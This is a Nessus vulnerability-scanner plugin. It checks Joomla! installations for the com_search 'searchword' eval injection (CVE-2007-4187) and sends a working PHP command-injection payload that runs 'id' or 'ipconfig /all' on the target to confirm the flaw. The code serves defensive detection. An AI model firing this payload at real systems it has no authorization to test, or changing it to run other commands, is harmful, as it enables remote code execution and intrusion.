#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25992);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2007-4187");
  script_bugtraq_id(24997);
  script_osvdb_id(41260);

  script_name(english:"Joomla! CMS com_search Component 'searchword' Parameter RCE");
  script_summary(english:"Attempts to run a command via Joomla!.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Joomla! running on the remote host is affected by a
remote code execution vulnerability within the
com_search/views/search/tmpl/default_results.php script due to
improper sanitization of user-supplied input to the 'searchword'
parameter before passing it to the eval() function. An
unauthenticated, remote attacker can exploit this issue to disclose
arbitrary files or execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user ID.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2007/Jul/447");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Joomla! version 1.5 RC1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');
  script_cwe_id(94);

  script_set_attribute(attribute:"vuln_publication_date",value:"2007/07/22");
  script_set_attribute(attribute:"patch_publication_date",value:"2007/07/22");
  script_set_attribute(attribute:"plugin_publication_date",value:"2007/09/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig%20/all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig%20/all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig%20/all'] = 'Windows IP Configuration|Subnet Mask|IP(v(4|6)?)? Address';

# Try to exploit the issue to run a command.
foreach cmd (cmds)
{
  if (cmd == 'id') attack = urlencode(str:'";system('+cmd+');#');
  else attack = urlencode(str:'";system("'+cmd+'");#');

  url = "/index.php?searchword="+attack+"&option=com_search&Itemid=1";

  r = http_send_recv3(
    method : "GET",
    port   : port,
    item   : dir + url,
    exit_on_fail : TRUE
  );
  res = r[2];

  if (egrep(pattern:cmd_pats[cmd], string:res))
  {
    vuln = TRUE;
    line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    if (line)
    {
      if ("Search for <b>" >< line)
        line = strstr(line, "Search for <b>") - "Search for <b>";
    }
    else line = res;
    break;
  }
}
if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  cmd         : cmd,
  request     : make_list(install_url + url),
  output      : chomp(line)
);
exit(0);
